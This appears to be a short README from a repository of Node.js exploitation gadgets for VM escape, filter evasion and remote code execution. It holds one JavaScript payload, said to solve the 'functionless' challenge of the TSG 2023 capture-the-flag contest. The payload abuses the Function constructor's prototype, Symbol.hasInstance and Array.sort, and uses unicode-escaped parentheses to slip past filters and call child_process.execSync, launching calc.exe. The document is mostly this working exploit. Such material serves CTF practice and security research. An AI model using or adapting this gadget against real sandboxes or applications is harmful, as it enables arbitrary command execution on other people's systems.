# Nodejs-gadget
Nodejs gadget for escaping VM, fooling syntax parser, filter evasion, RCE, ....

### Used to solve `functionless` in TSG 2023
```js
toString.constructor.prototype.toString=toString.constructor.prototype.call;
a = ["process.mainModule.require\u0028'child_process'\u0029.execSync\u0028'calc.exe'\u0029","a"];
toString.constructor instanceof {[Symbol.hasInstance]:a.sort, __proto__: a};
```
